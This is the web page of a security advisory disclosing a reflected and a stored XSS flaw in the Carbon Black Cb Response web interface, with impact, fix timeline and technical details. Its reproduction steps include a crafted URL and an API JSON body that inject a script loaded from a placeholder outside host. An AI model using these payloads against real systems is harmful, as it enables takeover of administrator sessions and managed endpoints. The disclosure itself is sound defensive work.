<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Carbon Black Cb Response Multiple XSS</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/carbon-black/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="Carbon Black Cb Response Multiple XSS">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/carbon-black/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="Carbon Black Cb Response Multiple XSS">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/carbon-black/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Carbon Black Cb Response Multiple XSS</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Cb Response</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td> MWR-2017-001</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>XSS</td>
          </tr>
        </table>
        
        <h1 class="Heading2nonum">Description</h1>
<p>Cb Response is an endpoint security platform developed by Carbon Black and features a centralized web interface to manage and analyse data that are provided by sensors on the actual endpoints.</p>
<p>This web interface also features role management for analysts, effectively allowing customers to separate privileges between read-only analysts and global administrators.</p>
<p>The latter are provided with incident-response capabilities such as live remote administration of managed endpoints, which makes them a prime target for attackers looking to compromise the enterprise infrastructure.</p>
<p>MWR has identified two XSS vulnerabilities in the web interface that could allow for abuse of those capabilities by remote attackers if exploited.</p>
<h1 class="Heading2nonum">Impact</h1>
<p>To exploit this issue, the attacker needs to trick an authenticated analyst into visiting a URL that serves a malicious, attacker-controlled web application.</p>
<p>If the victim is a global administrator, full infrastructure compromise can be gained at this point.</p>
<p>In the case of a low-privileged analyst the same vulnerability may be used to trigger a secondary XSS, effectively combining both bugs in a single exploit-chain that requires very little user interaction. If this technique succeeds, the result is again full compromise of all endpoints.</p>
<h1 class="Heading2nonum">Cause</h1>
<p>Insufficient or absent output encoding of user-supplied strings when displayed by the Cb Response web application.</p>
<h1 class="Heading2nonum">Interim Workaround</h1>
<p>Disable JavaScript for browsers used to access the web interface.</p>
<h1 class="Heading2nonum">Solution</h1>
<p>In order to remediate the issue, a patch is available through regular update channels. It is understood that version 5.2.5 addresses this vulnerability. However, this has not been verified by MWR.</p>
<p>Cloud customers do not need to take any further action as the vendor has remediated the issue.</p>
<h1>Technical details</h1>
<p><strong>Issue #1, reflected XSS in /api/v1/banning/blacklist</strong></p>
<p>The GET parameter named "filter" allows analysts to specify a custom expression to filter blacklisted hashes for certain properties. This expression is parsed by a routine that displays an error message when the input is invalid. However, this error message is served with the default content-type "text/html" without escaping the faulty part of the input expression, leading to a classic reflected cross-site-scripting issue. To reproduce this issue on a vulnerable version, simply navigate to the following URL as an authenticated user:</p>
<pre>https://carbon.black.server/api/v1/banning/blacklist?filter=x+%3D%3D+a&lt;script+src=//link.to/poc.js&gt;&lt;/script&gt;</pre>
<p><strong>Issue #2, stored XSS in User-Management panel</strong></p>
<p>Whilst user’s cannot use the web interface to include non-alphanumeric characters in their names, this is validated client side only and a request to the underlying API endpoint (as shown below) can be used to circumvent this client side validation. This input can include arbitrary characters in user properties such as first name (as shown in the example below) or last name. When a global administrator visits the user management panel in the UI and hovers over the malformed username, the properties were found to not be escaped properly resulting in stored JavaScript executing in the context of the administrator’s session.</p>
<pre>{"id":"&lt;your_username&gt;","username":"&lt;your_username&gt;","first_name":"DELETE ME! DELETE ME! DELETE ME! DELETE ME!\u0022&gt;&lt;script src=//link.to/poc.js&gt;&lt;/script alt=\u0022","last_name":"some_last_name","global_admin":false,"auth_token":"&lt;your token&gt;","email":"x@ema.il"}</pre>
<h1 class="Heading2nonum"><span>Proof of Concept Exploit</span></h1>
<p>MWR InfoSecurity developed a proof of concept exploit that retrieves all registered endpoints (called "sensors" in Carbon Black terminology) and executes an arbitrary command on each of them. An advanced, weaponized exploit would be able to determine the privilege level of the current user and either escalate privileges to global administrator or immediately compromise all registered endpoints, combining both bugs as needed.</p>
<h1>Detailed Timeline</h1>
<table cellspacing="0" cellpadding="0"><tbody><tr><td width="194" valign="top">
<p>Date</p>
</td>
<td width="472" valign="top">
<p>Summary</p>
</td>
</tr><tr><td width="194" valign="top">
<p><span>2016-10-11</span></p>
</td>
<td width="472" valign="top">
<p><span>Issue reported to vendor</span></p>
</td>
</tr><tr><td width="194" valign="top">
<p><span>2016-10-12</span></p>
</td>
<td width="472" valign="top">
<p><span>Vendor verified issue</span></p>
</td>
</tr><tr><td width="194" valign="top">
<p><span>2016-10-14</span></p>
</td>
<td width="472" valign="top">
<p><span>Vendor announced plans to release a fix with patch version 5.2.1</span></p>
</td>
</tr><tr><td width="194" valign="top">
<p><span>2016-12-01</span></p>
</td>
<td width="472" valign="top">
<p><span>Fix released to cloud customers</span></p>
</td>
</tr><tr><td width="194" valign="top">
<p><span>2016-12-28</span></p>
</td>
<td width="472" valign="top">
<p><span>Vendor released patched version 5.2.5 to on premises customers </span></p>
</td>
</tr><tr><td width="194" valign="top">
<p><span>2017-01-11</span></p>
</td>
<td width="472" valign="top">
<p><span>Vendor informed MWR InfoSecurity that a patch is available</span></p>
</td>
</tr></tbody></table>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/carbon-black/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/carbon-black/&text=Carbon Black Cb Response Multiple XSS" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/carbon-black/&title=Carbon Black Cb Response Multiple XSS" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      
      <a href="/assets/BlogFiles/mwri-carbon-black-cb-response-xss-2017-01-24.pdf" class="flex-container__box">
            <span class="content-type">Download</span>
            
            <h3 class="flex-container__box-title">Download the advisory here.</h3>
            
      </a>
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/carbon-black/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
